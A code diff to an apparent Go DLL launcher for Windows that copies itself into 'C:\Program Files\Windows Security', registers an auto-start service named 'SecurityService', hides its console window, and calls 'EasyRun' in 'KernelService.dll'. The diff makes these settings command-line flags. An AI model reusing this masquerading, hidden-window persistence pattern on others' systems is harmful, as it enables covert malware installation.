@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"io"
 	"os"
@@ -25,19 +26,19 @@ go build -ldflags="-H windowsgui -s -w" -o go_program.exe main.go
 */
 func main() {
 	var (
-		fileName   = "KernelService"                     // DLL名称
-		library    = fileName + ".dll"                   // 待加载DLL
-		libFunc    = "EasyRun"                           // DLL中的函数
-		destFolder = `C:\Program Files\Windows Security` // 程序拷贝路径
-		svrName    = "SecurityService"                   // 自启动项名称
-		fileExists = func(filename string) bool {
-			_, err := os.Stat(filename)
-			return !os.IsNotExist(err)
-		}
-		failed = 0
+		fileName, libFunc, destFolder, svrName string
+		failed                                 = 0
+		visible                                = false
 	)
+	flag.BoolVar(&visible, "visible", false, "Set the window visible (default false)")           // 窗口是否可见
+	flag.StringVar(&fileName, "name", "KernelService", "Give the dll name")                      // DLL名称
+	flag.StringVar(&libFunc, "function", "EasyRun", "Give the dll function name")                // DLL中的函数
+	flag.StringVar(&destFolder, "path", `C:\Program Files\Windows Security`, "Installation dir") // 程序拷贝路径
+	flag.StringVar(&svrName, "service", "SecurityService", "Give the regist service name")       // 自启动项名称
+	flag.Parse()
 
 	//////////////////////////////////////////////////////////////////////////////////////
+	var library = fileName + ".dll"
 	// 获取当前程序的路径
 	exePath, err := os.Executable()
 	if err != nil {
@@ -104,7 +105,11 @@ func main() {
 
 	if handle, _, _ := procGetConsoleWindow.Call(); handle != 0 {
 		procShowWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
-		_, _, _ = procShowWindow.Call(handle, 0) // 隐藏窗口
+		if visible {
+			_, _, _ = procShowWindow.Call(handle, 5)
+		} else {
+			_, _, _ = procShowWindow.Call(handle, 0) // 隐藏窗口
+		}
 	}
 
 	//////////////////////////////////////////////////////////////////////////////////////
@@ -113,6 +118,7 @@ func main() {
 		// 如果DLL位数和当前Go程序不匹配将进入此处
 		if r := recover(); r != nil {
 			fmt.Println("Recovered in main: ", r)
+			time.Sleep(5 * time.Second)
 		}
 	}()
 	var oldFile = filepath.Join(curDir, fileName+".old")
@@ -158,6 +164,11 @@ func main() {
 		fmt.Printf(">> Free library '%s'!\n", library)
 		time.Sleep(2 * time.Second)
 	}
+}
+
+func fileExists(filename string) bool {
+	_, err := os.Stat(filename)
+	return !os.IsNotExist(err)
 }
 
 // isAdmin 检查当前程序是否是以管理员身份运行
